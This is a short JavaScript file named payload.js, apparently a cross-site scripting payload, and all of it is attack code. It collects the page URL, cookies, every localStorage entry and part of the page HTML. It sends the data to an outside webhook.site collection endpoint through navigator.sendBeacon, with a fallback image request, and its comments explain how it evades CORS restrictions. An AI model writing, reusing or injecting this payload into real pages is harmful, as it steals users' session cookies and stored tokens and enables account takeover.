// payload.js
(() => {
  const data = {
    url: location.href,
    cookie: document.cookie,                          // may be empty if HttpOnly
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    html: document.documentElement.outerHTML.slice(0, 6000)  // trim to keep it small
  };

  try {
    // Prefer sendBeacon so we don't need CORS and it works even on unload
    const ok = navigator.sendBeacon(
      "https://webhook.site/5b676383-5988-4e81-aacd-65f41e1aa771",
      new Blob([JSON.stringify(data)], { type: "text/plain" })
    );

    if (!ok) {
      // Fallback via GET image (length-limited)
      const i = new Image();
      i.src = "https://webhook.site/5b676383-5988-4e81-aacd-65f41e1aa771?d=" +
              encodeURIComponent(JSON.stringify(data));
    }
  } catch (e) {}
})();
